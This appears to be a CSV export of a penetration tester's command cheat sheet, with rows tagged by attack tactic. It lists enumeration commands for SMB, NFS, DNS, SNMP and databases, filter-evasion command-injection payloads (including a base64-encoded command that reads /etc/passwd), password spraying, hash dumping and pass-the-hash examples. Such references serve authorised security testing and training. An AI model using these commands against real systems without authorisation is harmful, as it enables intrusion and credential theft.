Vector,Security Domains,OS,Description,Target_Technology,URL
Git Status/Git Cached,"Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), GIT (https://www.notion.so/GIT-1d84c8e5237680dcb27de40b1f932280?pvs=21)",Linux,Find info that has not been committed.,,
Kerberos: Extract TGS from PCAP file,Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21),"Python, Windows",Looking for SPN?,"python (https://www.notion.so/python-1444c8e523768064b118fb3c0d424051?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)",
find with regex,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,use the find command to search for multiple matches and use regex,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
Enumerate disks: lshw,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,install lshw and list all disks,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
Windows Command Document,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Windows,,"PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), cmd (https://www.notion.so/cmd-14b4c8e52376803e8170f7c482df8ca3?pvs=21)",
Enumerate for connected webcam,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Windows,Determine webcam details,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
Nuclei: Only use new templates,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Nuclei new templates scan,"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), nuclei (https://www.notion.so/nuclei-1474c8e5237680ea945ecb752fccd88c?pvs=21)",
%09,"Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Linux,Tabs instead of spaces,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
${IFS},"Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Linux,Space Field Separator,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
"{ls,-la}","Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Linux,Commas will be replaced with spaces,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
${PATH:0:1},"Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Linux,Will be replaced with /,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
${LS_COLORS:10:1},"Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Linux,Will be replaced with ;,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
"$(tr ""[A-Z]"" ""[a-z]""<<<""WhOaMi"")","Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Linux,Execute command regardless of cases,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
"$(a=""WhOaMi"";printf %s ""${a,,}"")","Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Linux,Execute command regardless of cases,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
$(rev<<<'imaohw'),"Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Linux,Reverse a string,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==),"Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Linux,Execute Base64 string,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
curl -s https://crt.sh/\?q\=<target-domain>\&output\=json | jq .,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"Linux, Windows",Certificate transparency.,HTTPs (https://www.notion.so/HTTPs-1434c8e523768019a037eea3c9eef66c?pvs=21),
openssl s_client -connect <FQDN/IP>:21 -starttls ftp,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Interact with FTP over SSL/TLS,ftp (https://www.notion.so/ftp-1434c8e5237680bcaf18c24e9f10cb87?pvs=21),
printenv,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Print environment variables,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
Get-ChildItem Env:,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Windows,Powershell: Print environment variables,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
"iex ""$('imaohw'[-1..-20] -join '')""",Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21),Windows,Execute Reversed String,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
Convert String to Base64 Example,Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21),Windows,Encode to Base64,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
Execute Base64 Encoded Command Example,Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21),Windows,Execute Base64 Encoded Command,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
wget -m --no-passive ftp://anonymous:anonymous@<target>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Download all files from anonymous FTP server,ftp (https://www.notion.so/ftp-1434c8e5237680bcaf18c24e9f10cb87?pvs=21),
smbclient -N -L //<FQDN/IP>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Null session authentication on SMB.,smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
smbclient //<FQDN/IP>/<share>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Connect to a specific SMB share.,smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
,,,,,
"rpcclient -U """" <FQDN/IP>",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Interaction with the target using RPC.,"smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21), rpc (https://www.notion.so/rpc-1444c8e5237680da82dbc974cd78a3f5?pvs=21)",
samrdump.py <FQDN/IP>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"Impacket, Linux",Username enumeration using Impacket scripts.,"smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21), impacket (https://www.notion.so/impacket-1444c8e523768059ab69ddf37318b307?pvs=21)",https://github.com/fortra/impacket
smbmap -H <FQDN/IP>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Enumerating SMB shares.,smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
smbmap -H <FQDN/IP> - r <SHARE>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,"Recursive network share enumeration ",smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
"smbmap -H <FQDN/IP> --download ""notes\note.txt""",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Download file,smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
"smbmap -H <FQDN/IP> --upload test.txt ""notes\test.txt""",Persistence (https://www.notion.so/Persistence-1434c8e523768074b5d4daa95c78dbbb?pvs=21),Linux,Upload File,smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
crackmapexec smb <FQDN/IP> --shares -u '' -p '',Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Crackmapexec enumerate null sessions,smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
crackmapexec smb <FQDN/IP> -u /tmp/userlist.txt -p 'Company01!',Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,password spray,smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
enum4linux-ng.py <FQDN/IP> -A,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,SMB enumeration,smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),https://github.com/cddmp/enum4linux-ng
"nxc smb 172.25.90.128 -u smb_users.txt -p smb_passwords.txt
",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,NXC Password Spray,smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),https://github.com/Pennyw0rth/NetExec
nxc smb 172.25.90.128 -u USER_FOUND -p PASSWORD_FOUND -M spider_plus,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Enumerate smb share and create .json file,smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),https://github.com/Pennyw0rth/NetExec
showmount -e <FQDN/IP>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Show available NFS shares.,nfs (https://www.notion.so/nfs-1444c8e5237680b4ab46cb70103b1336?pvs=21),
mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Mount the specific NFS share.umount ./target-NFS,nfs (https://www.notion.so/nfs-1444c8e5237680b4ab46cb70103b1336?pvs=21),
dig ns <domain.tld> @<nameserver>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,NS request to the specific nameserver.,dns (https://www.notion.so/dns-1444c8e52376808aa820e13096bf807f?pvs=21),
dig any <domain.tld> @<nameserver>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,ANY request to the specific nameserver.,dns (https://www.notion.so/dns-1444c8e52376808aa820e13096bf807f?pvs=21),
dig axfr <domain.tld> @<nameserver>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,AXFR: Zone Transfer,dns (https://www.notion.so/dns-1444c8e52376808aa820e13096bf807f?pvs=21),
dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Subdomain brute forcing.,dns (https://www.notion.so/dns-1444c8e52376808aa820e13096bf807f?pvs=21),https://github.com/fwaeytens/dnsenum
curl -k 'imaps://<FQDN/IP>' --user <user>:<password>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Log in to the IMAPS service using cURL.,imaps (https://www.notion.so/imaps-1444c8e5237680e39c45ef6c42dcf61c?pvs=21),
openssl s_client -connect <FQDN/IP>:imaps,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Connect to the IMAPS service.,imaps (https://www.notion.so/imaps-1444c8e5237680e39c45ef6c42dcf61c?pvs=21),
openssl s_client -connect <FQDN/IP>:pop3s,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Connect to the POP3s service.,pop3s (https://www.notion.so/pop3s-1444c8e52376809daed9f51270c28a69?pvs=21),
snmpwalk -v2c -c <community string> <FQDN/IP>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Querying OIDs using snmpwalk.,snmp (https://www.notion.so/snmp-1444c8e523768043b6accd2ebda01382?pvs=21),
onesixtyone -c community-strings.list <FQDN/IP>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Bruteforcing community strings of the SNMP service.,snmp (https://www.notion.so/snmp-1444c8e523768043b6accd2ebda01382?pvs=21),https://github.com/trailofbits/onesixtyone
braa <community string>@<FQDN/IP>:.1.*,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Bruteforcing SNMP service OIDs.,snmp (https://www.notion.so/snmp-1444c8e523768043b6accd2ebda01382?pvs=21),https://github.com/mteg/braa
mysql -u <user> -p<password> -h <FQDN/IP>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Login to the MySQL server.,mysql (https://www.notion.so/mysql-1444c8e523768019a5acd8abdc5f59f6?pvs=21),
mssqlclient.py <user>@<FQDN/IP> -windows-auth,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Log in to the MSSQL server using Windows authentication.,mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
msf6 auxiliary(scanner/ipmi/ipmi_version),Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,IPMI version detection.,ipmi (https://www.notion.so/ipmi-1444c8e523768072b017fa81b4505c3b?pvs=21),
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes),Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Dump IPMI hashes.,ipmi (https://www.notion.so/ipmi-1444c8e523768072b017fa81b4505c3b?pvs=21),
ssh-audit.py <FQDN/IP>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Remote security audit against the target SSH service.,ssh (https://www.notion.so/ssh-1444c8e5237680f29279ce80e0cf529b?pvs=21),https://github.com/jtesta/ssh-audit
ssh <user>@<FQDN/IP>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,ssh login,ssh (https://www.notion.so/ssh-1444c8e5237680f29279ce80e0cf529b?pvs=21),
ssh -i private.key <user>@<FQDN/IP>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,ssh with private key,ssh (https://www.notion.so/ssh-1444c8e5237680f29279ce80e0cf529b?pvs=21),
ssh <user>@<FQDN/IP> -o PreferredAuthentications=password,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,enforce password authentication,ssh (https://www.notion.so/ssh-1444c8e5237680f29279ce80e0cf529b?pvs=21),
rdp-sec-check.pl <FQDN/IP>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Check the security settings of the RDP service.,rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),https://github.com/CiscoCXSecurity/rdp-sec-check
"xfreerdp /u:<user> /p:""<password>"" /v:<FQDN/IP>","Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21)",Linux,rdp client,rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),
evil-winrm -i <FQDN/IP> -u <user> -p <password>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,winrm client,winrm (https://www.notion.so/winrm-1444c8e52376805991b6e10d41025783?pvs=21),
./odat.py all -s <FQDN/IP>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,oracle database enumeration,oracle (https://www.notion.so/oracle-1444c8e5237680789600f1b15e3fa0ec?pvs=21),
sqlplus <user>/<pass>@<FQDN/IP>/<db>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,oracle database login,oracle (https://www.notion.so/oracle-1444c8e5237680789600f1b15e3fa0ec?pvs=21),
http://odat.py example,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,upload a file,oracle (https://www.notion.so/oracle-1444c8e5237680789600f1b15e3fa0ec?pvs=21),
http://crt.sh subdomain enumeration,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Subdomain enumeration via crt.sh,dns (https://www.notion.so/dns-1444c8e52376808aa820e13096bf807f?pvs=21),
rpcclient brute force example,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"Impacket, Linux",Brute force users: rpcclient,"rpc (https://www.notion.so/rpc-1444c8e5237680da82dbc974cd78a3f5?pvs=21), impacket (https://www.notion.so/impacket-1444c8e523768059ab69ddf37318b307?pvs=21)",https://github.com/fortra/impacket
Subdomain Brute Force Example,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Brute force subdomains,dns (https://www.notion.so/dns-1444c8e52376808aa820e13096bf807f?pvs=21),
rsync enumeration,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,enumerate rsync shares,rsync (https://www.notion.so/rsync-1444c8e5237680118c9cc462fa10b668?pvs=21),
smtp-user-enum -M RCPT -U userlist.txt -D mailserver.local -t 127.0.0.1,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,enumerate smtp users,smtp (https://www.notion.so/smtp-1444c8e523768063a9fad4623d09ce5d?pvs=21),https://pentestmonkey.net/tools/user-enumeration/smtp-user-enum
imap commands,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,enumerate imap,imap (https://www.notion.so/imap-1444c8e5237680d0b8b8ceab811e309e?pvs=21),
pop3 commands,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,enumerate pop3,pop3 (https://www.notion.so/pop3-1444c8e523768094b845e25718ebd32c?pvs=21),
Hydra Brute Force FTP,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,brute force ftp,ftp (https://www.notion.so/ftp-1434c8e5237680bcaf18c24e9f10cb87?pvs=21),
,,,,,
impacket-psexec administrator:'Password123!'@<FQDN/IP>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"Impacket, Linux",Connect to SMB,"smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21), impacket (https://www.notion.so/impacket-1444c8e523768059ab69ddf37318b307?pvs=21)",https://github.com/fortra/impacket
crackmapexec smb <FQDN/IP> -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec,"Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21)",Linux,Crackmapexec Execute Command,smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
crackmapexec smb <FQDN/IP> -u administrator -p 'Password123!' --loggedon-users,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Crackmapexec Enumerate logged on users,smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
crackmapexec smb <FQDN/IP> -u administrator -p 'Password123!' --sam,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Crackmapexec Dump hashes,smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE,Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21),Linux,Crackmapexec Pass the Hash,smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30,Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21),Linux,Connect to MSSQL and specify min and max column widths of 30,mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
sqsh -S <FQDN/IP> -U julio -P 'MyPassword!' -h,Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21),Linux,Connect to MSSQL,mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
sqsh -S <FQDN/IP> -U .\\julio -P 'MyPassword!' -h,Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21),Linux,Connect to MSSQL with windows authentication,mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
sqlcmd command examples,"Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21)",Linux,List of MSSQL Commands,mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
mysql command examples,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,List of MySQL Commands,mysql (https://www.notion.so/mysql-1444c8e523768019a5acd8abdc5f59f6?pvs=21),
,,,,,
crowbar -b rdp -s <FQDN/IP/MASK> -U users.txt -c 'password123',Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Password spraying against the RDP service.,rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),
Hydra Brute Force RDP,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Brute Force RDP,rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),
rdesktop -u admin -p password123 <FQDN/IP>,Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21),Linux,Connect to RDP,rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),
